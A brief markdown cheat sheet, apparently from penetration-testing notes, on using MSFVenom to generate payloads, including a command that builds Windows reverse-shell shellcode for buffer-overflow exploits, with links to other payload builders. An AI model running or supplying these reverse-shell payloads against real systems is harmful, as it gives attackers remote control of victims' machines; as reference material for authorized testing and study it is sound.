# MSFVenom

MSFVenom is a payload generator.

## Create a payload
```bash
msfvenom -p [payload] LHOST=[ip] LPORT=[port] -f [format] > [output]
```

## Create a shellcode for Windows buffer overflows
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=[ip] LPORT=[port] EXITFUNC=thread -b "[badchars]" -f c
```

The main MSFVenom payloads can be found here:
[MSFVenom payloads](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom).

Payloads can also be generated using [RevShells](https://www.revshells.com/) or [PenTest.WS](https://pentest.ws/tools/venom-builder).
